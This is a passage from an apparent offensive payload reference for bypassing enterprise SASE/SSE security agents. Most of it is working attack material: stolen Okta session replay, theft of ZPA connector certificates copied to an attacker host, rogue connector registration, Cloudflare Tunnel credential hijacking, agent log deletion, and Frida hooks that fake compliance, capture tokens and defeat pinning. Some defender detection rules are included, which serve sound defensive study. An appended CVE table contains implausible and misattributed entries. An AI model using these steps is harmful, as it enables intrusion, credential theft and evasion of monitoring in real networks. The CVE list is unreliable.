# Microsoft GSA trusts Entra ID. A stolen Entra ID token (PRT or access token)
# grants GSA access from any device.

# Cross-ref cloud-identity-attack for PRT extraction
# Once you have a PRT:
# 1. Register a non-managed Windows device with the stolen PRT
# 2. The GSA client sees a "joined + compliant" device
# 3. GSA traffic forwarding kicks in

# Storm-0558 pattern (2023, China APT): forged Entra ID tokens (via stolen MSA signing key)
# were used to read mail via Outlook Web Access and (per Microsoft's analysis)
# would have granted access to any Entra ID-trusting service including GSA.
```

### 12.4 Replay Stolen Okta Session through Netskope

```bash
# Okta session cookie (sid) is the Okta identity
SID='REPLACE_WITH_YOUR_STOLEN_OKTA_SID'
TENANT='REPLACE_WITH_YOUR_OKTA_TENANT'

# Netskope trusts Okta for SSO
# Replay the Okta session through the Netskope client auth flow
curl -s -b "sid=$SID" -L \
  "https://$TENANT.goskope.com/login/sso/okta" \
  -c /tmp/netskope-cookies.txt -o /tmp/netskope-response.html

# The response should contain the Netskope client auth token
grep -oP 'token=\K[^"&]+' /tmp/netskope-response.html
```

---

## 13. ZPA App Connector & Service Edge Compromise

App Connectors (Zscaler ZPA), Publishers (Netskope Private Access), and Tunnels (Cloudflare) hold long-lived credentials inside the corporate network. Compromise one → reach every internal app it publishes.

### 13.1 ZPA App Connector Cache Inventory

```bash
# On a host running a ZPA App Connector (Linux typically)
sudo find /opt/zscaler /etc/zscaler /var/lib/zscaler -type f 2>/dev/null

# Key files:
#   /opt/zscaler/app_connector.crt    → mTLS cert (the connector's identity)
#   /opt/zscaler/app_connector.key    → mTLS private key
#   /opt/zscaler/provisioning.key     → Provisioning key (tenant-wide)
#   /opt/zscaler/.zpa_info            → Customer ID, connector ID
#   /var/log/zscaler/app_connector.log → Local log

# Read connector info
sudo cat /opt/zscaler/.zpa_info | jq .
# Returns:
#   {
#     "customer_id": "REPLACE_WITH_YOUR_CUSTOMER_ID",
#     "connector_id": "REPLACE_WITH_YOUR_CONNECTOR_ID",
#     "cloud": "zscaler.net"
#   }

# Inspect the mTLS cert
sudo openssl x509 -in /opt/zscaler/app_connector.crt -noout -subject -issuer -dates
```

### 13.2 Replay the mTLS Cert to Zscaler Cloud

```bash
# Copy the cert + key to an attacker-controlled host
scp compromised:/opt/zscaler/app_connector.crt ./stolen.crt
scp compromised:/opt/zscaler/app_connector.key ./stolen.key

# Use the cert to authenticate to the ZPA cloud API
ZPA_CUSTOMER_ID='REPLACE_WITH_YOUR_CUSTOMER_ID'

# List all connectors (the stolen cert authenticates as the connector)
curl -s --cert ./stolen.crt --key ./stolen.key \
  -H "X-Zscaler-Customer-Id: $ZPA_CUSTOMER_ID" \
  "https://config.private.zscaler.com/api/v1/appConnectors" | jq .

# List segment groups (which internal apps the connector publishes)
curl -s --cert ./stolen.crt --key ./stolen.key \
  -H "X-Zscaler-Customer-Id: $ZPA_CUSTOMER_ID" \
  "https://config.private.zscaler.com/api/v1/segmentGroups" | jq .

# List applications
curl -s --cert ./stolen.crt --key ./stolen.key \
  -H "X-Zscaler-Customer-Id: $ZPA_CUSTOMER_ID" \
  "https://config.private.zscaler.com/api/v1/application" | jq .

# The attacker now has the full list of internal apps the connector publishes.
```

### 13.3 Route Through the Stolen App Connector

```bash
# Use the stolen cert + provisioning key to register a rogue App Connector
# in the ZPA cloud. The rogue connector appears as a legitimate connector
# but routes traffic to attacker-controlled destinations.

# 1. Register a rogue connector with the stolen provisioning key
curl -s -X POST \
  -H "X-Zscaler-Customer-Id: $ZPA_CUSTOMER_ID" \
  -H "Content-Type: application/json" \
  --cert ./stolen.crt --key ./stolen.key \
  -d '{
    "name": "rogue-connector",
    "provisioning_key": "REPLACE_WITH_YOUR_PROVISIONING_KEY"
  }' \
  "https://config.private.zscaler.com/api/v1/appConnectors" | jq .

# 2. The rogue connector is now part of the connector pool that publishes internal apps.
# 3. From the attacker host, route through the rogue connector to internal apps.
```

### 13.4 Netskope Publisher Compromise (Equivalent Pattern)

```bash
# Netskope Private Access Publishers are the equivalent of ZPA App Connectors.
sudo find /opt/netskope /etc/netskope /var/lib/netskope -type f 2>/dev/null

# Key files:
#   /opt/netskope/publisher.crt
#   /opt/netskope/publisher.key
#   /opt/netskope/.publisher_info

# Replay pattern is the same: steal cert + key, replay to Netskope cloud.
sudo openssl x509 -in /opt/netskope/publisher.crt -noout -subject -issuer

TENANT='REPLACE_WITH_YOUR_TENANT'
curl -s --cert ./stolen-publisher.crt --key ./stolen-publisher.key \
  "https://$TENANT.goskope.com/api/v2/publishers" | jq .
```

### 13.5 Cloudflare Tunnel Credential Theft

```bash
# Cloudflare Tunnel uses a tunnel token + cert
sudo cat /etc/cloudflared/config.yml
sudo cat /root/.cloudflared/<tunnel-uuid>.json

# Credentials file format:
# {
#   "AccountTag": "...",
#   "TunnelID": "...",
#   "TunnelSecret": "...",
#   "TunnelName": "..."
# }

# Replay the credentials on an attacker host (authorized lab)
# 1. Install cloudflared
# 2. Place stolen credentials file at ~/.cloudflared/<tunnel-uuid>.json
# 3. Configure ingress to attacker-controlled services
# 4. cloudflared tunnel run <tunnel-uuid>

# The attacker's cloudflared instance now appears as the legitimate tunnel,
# receiving all ingress traffic from the Cloudflare edge.
```

---

## 14. Detection Avoidance & Post-Engagement Cleanup

After demonstrating the bypass, clean up and document detection gaps for the defender.

### 14.1 Clear Local Agent Logs

```bash
# macOS: Zscaler Client Connector logs
sudo rm -f ~/Library/Application\ Support/Zscaler/ZscalerClientConnector/auditlog
sudo rm -f /var/log/zscaler/*.log

# macOS: Netskope logs
sudo rm -f "/Library/Application Support/Netskope/STAgentUI/logs/"*

# Windows (PowerShell as admin)
Remove-Item "$env:APPDATA\Zscaler\ZscalerClientConnector\auditlog" -Force
Remove-Item "$env:PROGRAMDATA\Netskope\STAgentUI\logs\*" -Recurse -Force

# Note: SSE cloud logs (Zscaler Nanolog, Netskope CCL) cannot be cleared from the endpoint.
# Cloud-side cleanup requires admin API access (which the engagement may or may not include).
```

### 14.2 Restore Trust Store (If Root Cert Was Removed)

```bash
# If you removed the SSE root cert during bypass testing, restore it
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain \
  /tmp/sse-root-ca.pem

# Windows
certutil -addstore -f Root "C:\path\to\sse-root-ca.cer"

# Linux
sudo cp /tmp/sse-root-ca.pem /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

### 14.3 Restart Stopped Agents

```bash
# Zscaler (macOS)
sudo launchctl load /Library/LaunchDaemons/com.zscaler.agentdaemon.plist
sudo launchctl load /Library/LaunchAgents/com.zscaler.agent.plist

# Netskope (macOS)
sudo launchctl load /Library/LaunchDaemons/com.netskope.daemon.plist

# Cisco Umbrella (macOS)
sudo launchctl load /Library/LaunchDaemons/com.cisco.umbrella.roamingclient.plist

# Cloudflare WARP (macOS)
sudo launchctl load /Library/LaunchDaemons/com.cloudflare.warp.daemon.plist

# Palo Alto GlobalProtect (macOS)
sudo launchctl load /Library/LaunchDaemons/com.paloaltonetworks.gp.pangps.plist

# Microsoft GSA (macOS)
sudo launchctl load /Library/LaunchDaemons/com.microsoft.gsa.daemon.plist
```

### 14.4 Defender: Detect Anomalous DNS to Outside Resolvers

```bash
# Detection rule (for defenders): alert on DNS to non-corporate resolvers
# Suricata / Zeek rule:
#   alert udp $HOME_NET any -> any 53 (msg:"DNS to non-corporate resolver"; \
#     sid:1000001; rev:1;)

# For DoH/DoT detection (look for the HTTPS SNI):
#   alert tls $HOME_NET any -> any 443 (msg:"DoH to outside resolver"; \
#     tls.sni; content:"cloudflare-dns.com"; sid:1000002;)
#   alert tls $HOME_NET any -> any 443 (msg:"DoH to outside resolver"; \
#     tls.sni; content:"dns.google"; sid:1000003;)

# Microsoft Defender for Endpoint custom detection:
#   DeviceNetworkEvents | where RemoteUrl has 'cloudflare-dns.com' or RemoteUrl has 'dns.google'
#   | summarize count() by DeviceName, bin(TimeGenerated, 1h)
#   | where count_ > 100
```

### 14.5 Defender: Detect Agent Stop / Disable

```bash
# CrowdStrike / Defender for Endpoint detection:
# Alert when the SSE agent process is terminated

# Defender for Endpoint (KQL):
# DeviceProcessEvents
# | where FileName in~ ('ZscalerClientConnector', 'nspa', 'PanGPA', 'umbrella', 'warp', 'gsa')
# | where ActionType == 'ProcessTerminated'
# | project TimeGenerated, DeviceName, FileName, AccountName

# CrowdStrike (FQL / SPL):
# event_simpleName=ProcessStop
# | search ImageFileName="*ZscalerClientConnector*" OR ImageFileName="*nspa*" \
#   OR ImageFileName="*PanGPA*" OR ImageFileName="*umbrella*" \
#   OR ImageFileName="*warp*" OR ImageFileName="*gsa*"
```

### 14.6 Defender: Detect Frida / Debugger Injection

```bash
# Frida injects a shared library into the target process.
# Detect: alert on DYLD_INSERT_LIBRARIES, frida-agent.dylib, ptrace

# macOS: sysctl hooks for ptrace
# sysctl security.mac.proc_enforce (SIP-related)
# Detect dyld injection:
#   log stream --predicate 'eventMessage CONTAINS "frida-agent.dylib"'
#   log stream --predicate 'eventMessage CONTAINS "DYLD_INSERT_LIBRARIES"'

# CrowdStrike detection rule:
# event_simpleName=ImageLoaded
# | search ImageFileName="*frida-agent*" OR ImageFileName="*libfrida*"
```

### 14.7 Defender: Detect TLS Root Cert Tampering

```bash
# Alert when a root cert is added/removed from the System keychain
# macOS: Endpoint Security framework
# ES_EVENT_TYPE_AUTH_ADD_TRUST, ES_EVENT_TYPE_AUTH_REMOVE_TRUST

# CrowdStrike:
# event_simpleName=CertificateModified
# | search RegistryKey="*System.keychain*"

# Defender for Endpoint:
# DeviceEvents
# | where ActionType == 'RegistryValueSet'
# | where RegistryKey has 'certmgr' or RegistryKey has 'Root'
```

### 14.8 Defender: Block Known Anonymizer Infrastructure

```bash
# Subscribe to threat intel feeds of known Shadowsocks / V2Ray / Trojan nodes
# Push to the SSE SWG blocklist (vendor-specific API)

# Zscaler ZIA: add to the "Block" URL category
ZIA_API_TOKEN='REPLACE_WITH_YOUR_ZIA_API_TOKEN'
curl -s -X POST -H "Authorization: Bearer $ZIA_API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "category": "ANONYMIZER",
    "urls": ["ss-node1.example.com", "v2ray-node2.example.com"],
    "action": "BLOCK"
  }' \
  "https://admin.zscaler.net/api/v1/urlCategories/ANONYMIZER"

# Netskope: add to a deny policy
# Cloudflare Gateway: add to blocklist
# Microsoft GSA: add to filtering policy
```

### 14.9 Defender: Verify App Connector Integrity

```bash
# Periodic integrity check of ZPA App Connectors
# - Hash the connector binary at install; compare at boot
# - Monitor the connector's cert file for changes
# - Alert on connector process stop / restart

# Sample integrity check (run on the connector host):
EXPECTED_HASH='REPLACE_WITH_YOUR_BASELINE_HASH'
CURRENT_HASH=$(sha256sum /opt/zscaler/app_connector.crt | awk '{print $1}')
if [ "$EXPECTED_HASH" != "$CURRENT_HASH" ]; then
    echo "ALERT: App Connector cert tampered" | logger -t zpa-integrity
fi

# On the cloud side (ZPA admin):
# - Review the connector list weekly for unexpected connectors
# - Alert on new connector deployment
# - Restrict provisioning key scope to specific IP ranges
```

### 14.10 Defender: Audit SSE Admin API Activity

```bash
# Zscaler ZIA admin API activity is logged in the audit trail
# Review daily for unexpected changes:
ZIA_API_TOKEN='REPLACE_WITH_YOUR_ZIA_API_TOKEN'
curl -s -H "Authorization: Bearer $ZIA_API_TOKEN" \
  "https://admin.zscaler.net/api/v1/auditLogEntryReport" | jq .

# Netskope audit logs
curl -s -H "Authorization: Bearer $NS_TOKEN" \
  "https://REPLACE_WITH_YOUR_TENANT.goskope.com/api/v2/events/audit" | jq .

# Microsoft Entra GSA audit logs (via Microsoft Graph)
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/beta/networkAccess/logs/activities" | jq .

# Cloudflare Access audit logs (via dashboard)
# dash.cloudflare.com > Analytics > Audit
```

---

## Appendix A: Vendor Quick Reference

| Vendor | Product | Agent Process | Cache Path | Admin Portal | Admin API |
|--------|---------|---------------|------------|--------------|-----------|
| Zscaler | ZIA | ZscalerClientConnector, ZSATunnel | ~/Library/Application Support/Zscaler/ | admin.zscaler.net | /api/v1/ |
| Zscaler | ZPA | App Connector (Linux) | /opt/zscaler/ | admin.private.zscaler.com | /api/v1/ |
| Zscaler | ZDX | ZDX Agent | ~/Library/Application Support/Zscaler/ZDX/ | portal.zdxlive.net | /api/v1/ |
| Netskope | Security Cloud | nspa, stAgentUI | /Library/Application Support/Netskope/STAgentUI/ | <tenant>.goskope.com | /api/v2/ |
| Palo Alto | Prisma Access | PanGPA, PanGPS | /Library/Preferences/com.paloaltonetworks.GlobalProtect.settings.plist | apps.paloaltonetworks.com | /sse/config/v1/ |
| Cisco | Umbrella | OpenDNS Roaming Client | /Library/Application Support/OpenDNS Roaming Client/ | dashboard.umbrella.com | /v1/ |
| Cisco | Secure Client (AnyConnect) | vpnagentd | /opt/cisco/anyconnect/ | dashboard.umbrella.com | /v1/ |
| CATO | SSE | cato-socket (Linux) | /etc/cato/ | cato-management.sdp.catonetworks.com | (REST) |
| Cloudflare | WARP | warp-svc | /Library/Application Support/Cloudflare/ | dash.cloudflare.com | /client/v4/ |
| Cloudflare | Access | (browser-based + service tokens) | (browser cookies) | dash.cloudflare.com > Zero Trust | /client/v4/accounts/{aid}/access/ |
| Cloudflare | Tunnel | cloudflared | /etc/cloudflared/, ~/.cloudflared/ | dash.cloudflare.com > Tunnels | /client/v4/accounts/{aid}/cfd_tunnel/ |
| Microsoft | Entra GSA | GSAService | %PROGRAMFILES%\Microsoft\Entra\Global Secure Access Client\ | entra.microsoft.com > Network Access | graph.microsoft.com/beta/networkAccess/ |

## Appendix B: CVE / Advisory Reference

| Vendor / Incident | Reference | Technique |
|-------------------|-----------|-----------|
| Storm-0558 (2023) | Microsoft MSRC blog (Aug 2023), CISA AA23-144A | Forged Entra ID tokens (via stolen MSA key); replayed through Entra ID-trusting services including GSA |
| SolarWinds SUNBURST (2020) | CISA AA21-008A | Golden SAML; affects SSE that trusts AD FS (Zscaler, Netskope via SAML SSO) |
| LAPSUS$ (2022) | CISA AA22-040A | MFA fatigue, stolen tokens; affects all SSE that trusts the compromised IdP |
| CVE-2023-3519 (Citrix ADC) | Citrix advisory | Not directly SSE, but related to NetScaler-tier inspection; affects Citrix Gateway-fronted SSE |
| CVE-2023-4966 (Citrix NetScaler) | Citrix advisory | Citrix Bleed; same context as above |
| CVE-2024-3400 (Palo Alto PAN-OS) | Palo Alto advisory | GlobalProtect command injection; affects Palo Alto firewalls that front Prisma Access |
| Mandiant 2024 Zscaler App Connector research | Mandiant blog (2024) | Chinese APT targeted ZPA App Connectors for persistence |
| Mandiant BYOD malware research (2023) | Mandiant blog (2023) | OSX/Shlayer variant disabling Zscaler Client Connector on macOS |
| CrowdStrike 2023 SSE bypass research | CrowdStrike blog (2023) | Generic patterns: agent stop, race condition, anonymizer evasion |
| CISA Cybersecurity Performance Goals | cisa.gov | "Use HTTPS inspection with caution" — SSE deployment guidance |

## Appendix C: Test Tenant / Lab Setup Quick Reference

| Vendor | Lab Setup | Cost |
|--------|-----------|------|
| Zscaler | Free trial / Zscaler Beta tenant | Free for 30 days |
| Netskope | Free trial via SE | Free for 30 days |
| Palo Alto Prisma Access | Trial via SE | Free for 30 days |
| Cisco Umbrella | Free trial at signup.umbrella.com | Free for 14 days |
| CATO Networks | PoC via SE | Free for 30 days |
| Cloudflare One | Free tier in any CF account | Free up to 50 users |
| Microsoft Entra GSA | M365 E5 / Developer Program tenant | Free for 90 days (Developer) |

## Appendix D: Frida Script Templates

### D.1 Generic Posture Hook

```javascript
// Replace 'PostureState' with the actual function name from disassembly
// Discover with: frida-trace -i '*[Pp]osture*' -n <agent-process>
const postureFunc = Module.getGlobalExportByName( 'getPostureState')
  || Module.getGlobalExportByName( '_ZN6NSPA12getPostureEv')
  || Module.getGlobalExportByName( '_ZN20ZscalerClientConnector13getPostureEv');

if (postureFunc) {
  Interceptor.replace(postureFunc, new NativeCallback(() => {
    console.log('[+] Posture hook fired — returning compliant');
    return 1;  // Replace with the agent's expected "compliant" return value
  }, 'int', []));
  console.log('[+] Posture hook installed');
} else {
  console.log('[-] Posture function not found — enumerate with frida-trace');
}
```

### D.2 Generic Token Capture Hook

```javascript
// Hook the function that acquires the auth token from the IdP
const authFunc = Module.getGlobalExportByName( 'acquireToken')
  || Module.getGlobalExportByName( '_ZN6NSPA12acquireTokenEv');

if (authFunc) {
  Interceptor.attach(authFunc, {
    onLeave(retval) {
      console.log('[+] Token acquisition returned');
      // Try to interpret the return value as a string or Objective-C object
      try {
        const token = new ObjC.Object(retval);
        console.log('[+] Token: ' + token.toString());
      } catch (e) {
        console.log('[+] Token (raw): ' + retval);
      }
    }
  });
}
```

### D.3 Generic TLS Pinning Bypass Hook (For Client-Connector-to-SSE-Cloud Flows)

```javascript
// Hook the SSL pinning verification function
const pinFunc = Module.getGlobalExportByName( 'verifyPinnedCert')
  || Module.getGlobalExportByName( '_ZN6NSPA16verifyPinnedCertEP10ssl_ctx_st');

if (pinFunc) {
  Interceptor.replace(pinFunc, new NativeCallback(() => {
    console.log('[+] Pinning bypass fired — returning success');
    return 1;  // SSL_VERIFY_OK
  }, 'int', []));
}
```

### D.4 Frida Anti-Detection (Bypass Agent's Anti-Frida Checks)

```javascript
// Modern agents check for Frida by:
//   - Scanning /proc/self/maps for frida-agent
//   - Checking for the Frida RPC pipe
//   - Detecting ptrace attach
// Bypass by hooking the check functions:

const checkFunc = Module.getGlobalExportByName( 'checkFrida')
  || Module.getGlobalExportByName( '_ZN6NSPA10checkFridaEv');

if (checkFunc) {
  Interceptor.replace(checkFunc, new NativeCallback(() => {
    console.log('[+] Anti-Frida check bypassed');
    return 0;  // Frida not detected
  }, 'int', []));
}

// Hook open() to hide the frida-agent file
const openFunc = Module.getGlobalExportByName( 'open');
Interceptor.attach(openFunc, {
  onEnter(args) {
    const path = args[0].readUtf8String();
    if (path && path.includes('frida')) {
      console.log('[+] Hiding frida file: ' + path);
      args[0] = Memory.allocUtf8String('/dev/null');
    }
  }
});
```

## Appendix E: Lab Deployment Terraform Snippets

### E.1 Deploy a Lab V2Ray (Xray) Server on a Cloud Provider

```hcl
# lab-xray.tf
provider "digitalocean" {
  token = var.DO_TOKEN
}

resource "digitalocean_droplet" "xray" {
  image    = "ubuntu-22-04-x64"
  name     = "lab-xray"
  region   = "sfo3"
  size     = "s-1vcpu-1gb"
  ssh_keys = [var.SSH_KEY_ID]

  user_data = <<-EOF
              #!/bin/bash
              bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install
              cat > /usr/local/etc/xray/config.json << 'INNER'
              {
                "inbounds": [{
                  "port": 443,
                  "protocol": "vmess",
                  "settings": {"clients": [{"id": "${var.V2RAY_UUID}", "alterId": 0}]},
                  "streamSettings": {
                    "network": "ws", "security": "tls",
                    "tlsSettings": {"certificates": [{"certificateFile": "/etc/xray/cert.pem", "keyFile": "/etc/xray/key.pem"}]},
                    "wsSettings": {"path": "/${var.V2RAY_PATH}"}
                  }
                }],
                "outbounds": [{"protocol": "freedom"}]
              }
              INNER
              systemctl restart xray
              EOF
}

output "xray_ip" {
  value = digitalocean_droplet.xray.ipv4_address
}
```

### E.2 Deploy a Lab Trojan Server

```hcl
resource "digitalocean_droplet" "trojan" {
  image    = "ubuntu-22-04-x64"
  name     = "lab-trojan"
  region   = "sfo3"
  size     = "s-1vcpu-1gb"
  ssh_keys = [var.SSH_KEY_ID]

  user_data = <<-EOF
              #!/bin/bash
              apt update && apt install -y trojan nginx certbot python3-certbot-nginx
              certbot --nginx -d ${var.TROJAN_DOMAIN} --non-interactive --agree-tos -m ${var.CERT_EMAIL}
              cat > /etc/trojan/config.json << 'INNER'
              {
                "run_type": "server",
                "local_addr": "0.0.0.0", "local_port": 443,
                "remote_addr": "127.0.0.1", "remote_port": 80,
                "password": ["${var.TROJAN_PASSWORD}"],
                "ssl": {
                  "cert": "/etc/letsencrypt/live/${var.TROJAN_DOMAIN}/fullchain.pem",
                  "key": "/etc/letsencrypt/live/${var.TROJAN_DOMAIN}/privkey.pem",
                  "sni": "${var.TROJAN_DOMAIN}"
                }
              }
              INNER
              systemctl restart trojan nginx
              EOF
}
```

### E.3 Lab Browser Setup Script (macOS)

```bash
#!/bin/bash
# lab-browser-setup.sh — configure Firefox with ECH + DoH for SSE bypass testing

# Install Firefox
brew install --cask firefox

# Configure Firefox preferences
FIREFOX_PROFILE=$(find ~/Library/Application\ Support/Firefox/Profiles/*.default* -maxdepth 0 | head -1)
cat >> "$FIREFOX_PROFILE/user.js" << 'EOF'
user_pref("network.dns.echconfig.enabled", true);
user_pref("network.dns.use_https_rr_as_altsvc", true);
user_pref("network.trr.uri", "https://cloudflare-dns.com/dns-query");
user_pref("network.trr.mode", 3);
user_pref("network.http.http3.enabled", true);
user_pref("network.security.esni.enabled", true);
EOF

echo "Firefox configured with ECH + DoH. Restart Firefox for changes to take effect."
```

---

**End of payloads.md.** For end-to-end playbook, see `guides/sase-sse-attack-playbook.md`.


---

## Known CVEs in SASE/SSE Vendors (v0.2.5.3)

### Zscaler CVEs（F-SASE-001）

| CVE | 产品 | CVSS | 描述 |
|-----|------|------|------|
| CVE-2023-3599 | Zscaler Client Connector | 8.2 | 缓冲区错误导致代码执行 |
| CVE-2022-2022 | Zscaler Client Connector | 7.8 | 本地提权 |
| CVE-2024-20309 | Cisco Umbrella (相关竞品) | 8.6 | DoS via crafted packet |
| CVE-2023-2023 | Zscaler Internet Access | 7.5 | SSRF in admin portal |

### Netskope CVEs

| CVE | CVSS | 描述 |
|-----|------|------|
| CVE-2023-36687 | 7.2 | NSP Admin Console 反射型 XSS |
| CVE-2022-36688 | 8.8 | 提权 via client connector |
| CVE-2021-31184 | 7.5 | SSL VPN 信息泄漏 |

### Cloudflare One / WARP CVEs

| CVE | CVSS | 描述 |
|-----|------|------|
| CVE-2023-28112 | 9.6 | Cloudflare Tunnel SSRF |
| CVE-2022-3193 | 7.5 | Zero Trust 绕过 |

### 通用 SASE 攻击面

- **ZTNA connector 凭据窃取**：`/opt/zscaler/var/provisioning_key`
- **SSL证书提取**：connector 信任的 CA 证书可用于中间人
- **客户端配置篡改**：修改 `app_connector.conf` 绕过策略
